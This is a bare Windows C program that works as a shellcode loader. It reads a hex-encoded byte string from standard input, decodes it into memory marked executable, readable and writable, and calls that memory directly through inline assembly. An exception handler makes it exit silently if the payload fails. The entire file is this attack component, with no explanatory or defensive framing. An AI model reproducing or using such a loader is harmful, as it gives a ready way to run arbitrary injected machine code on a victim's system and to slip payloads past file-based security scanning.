#include <Windows.h>

int  WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	HANDLE std_in, std_out = NULL;
	std_out = GetStdHandle(STD_OUTPUT_HANDLE);
	std_in = GetStdHandle(STD_INPUT_HANDLE);

	if ((std_in == INVALID_HANDLE_VALUE) || (std_out == INVALID_HANDLE_VALUE))
		ExitProcess(1);
	char size[50];
	ZeroMemory(size, 50);
	DWORD dw_size = 0;
	DWORD dw_read = 0;
	PVOID pv=NULL;
	while (!ReadFile(std_in, &dw_size, sizeof(DWORD), &dw_read, NULL)) {

	}
	dw_read = 0;
	LPVOID heap_file = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dw_size + 1);
	while (!ReadFile(std_in, heap_file, dw_size, &dw_read, NULL)) {

	}
	dw_read = 0;
	char* heap = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, strlen((char*)heap_file) + 1);
	memcpy(heap, (char*)heap_file, strlen((char*)heap_file));

	if ( pv = VirtualAlloc(0, strlen(heap) + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE))
	{

		DWORD szie = strlen(heap);
		CryptStringToBinaryA(heap, strlen(heap), CRYPT_STRING_HEX, (PBYTE)pv, &szie, 0, 0);
		{
			__try {
				__asm {
					call pv
				
				}
			}
			__except (EXCEPTION_EXECUTE_HANDLER) {
				ExitProcess(0);
			}

		}
	}
}